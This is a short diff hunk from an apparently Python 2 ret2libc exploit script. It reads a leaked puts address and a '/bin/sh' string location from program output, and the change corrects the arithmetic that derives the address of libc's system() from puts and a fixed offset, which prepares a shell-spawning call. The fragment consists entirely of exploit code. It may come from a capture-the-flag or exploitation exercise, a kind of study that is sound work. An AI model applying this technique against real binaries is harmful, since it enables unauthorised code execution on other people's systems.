@@ -16,7 +16,7 @@ binSHString = tmp[6].split(" ")[1]
 offset = "-0x2a940"
 
 # Got address of system
-systemAddress = struct.pack("I", int(puts, 16) - int(offset, 16))
+systemAddress = struct.pack("I", int(puts, 16) + int(offset, 16))
 print "Offset: {}".format(offset)
 print "puts: {}".format(puts)
 print "systemAddress: {}".format(repr(systemAddress))
